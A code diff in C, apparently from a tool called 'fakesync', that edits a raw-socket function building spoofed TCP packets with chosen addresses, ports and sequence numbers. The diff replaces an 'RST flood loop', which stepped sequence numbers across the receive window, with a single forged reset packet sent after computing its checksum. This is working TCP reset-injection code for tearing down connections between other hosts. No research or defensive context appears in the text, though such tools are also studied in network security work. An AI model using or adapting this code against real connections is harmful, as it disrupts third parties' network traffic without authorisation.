@@ -246,7 +246,7 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     // pack TCP header
     tcph -> source = sport; // source port
     tcph -> dest = dport; // destination port
-    tcph -> seq = 0; // sequence number init to 0
+    tcph -> seq = htonl(seq0); // sequence number
     tcph -> ack_seq = htonl(ack0); // ack sequence number
     tcph -> res1 = 0;
     tcph -> res2 = 0;
@@ -274,28 +274,33 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     psh -> protocol = IPPROTO_TCP; // TCP
     psh -> tcp_len = htons(tcp_len); // TCP segment length
 
+    // calculate check sum
+    tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); 
+
     // build sockaddr
     sa.sin_family = AF_INET;
     sa.sin_port = dport;
     sa.sin_addr.s_addr = daddr;
 
+    if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+    {
+        perror("fakesync: sendto()\n");
+    }
+
+    close(sockfd);
+
+
     // RST flood loop
-    for (count = 0; count < NUM_OF_RESET; count++) {
+    // for (count = 0; count < NUM_OF_RESET; count++) {
         // reset the server
-        tcph -> seq = htonl(seq0); // set seq number
-        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
+        // tcph -> seq = htonl(seq0); // set seq number
+        // cstcph -> seq = htonl(seq0); // set seq number in the checksum header
         // tcph -> ack_seq = htonl(ack0); // set ack seq number
         // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
-        tcph -> check = 0; // reset check sum
-        cstcph -> check = 0; // reset check sum  
-        tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
+        // tcph -> check = 0; // reset check sum
+        // cstcph -> check = 0; // reset check sum  
 
-        if ((num = sendto(sockfd, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-        {
-            perror("fakesync: sendto()\n");
-        }
-        seq0 += (uint32_t)(win / 2);
+        
         // fprintf(logfile, "DEBUG reset packet sent\n saddr: %u\ndaddr: %u\nseq: %u\nack: %u\n", saddr, daddr, seq0, ack0);
-    }
-    close(sockfd);
+    // }
 }
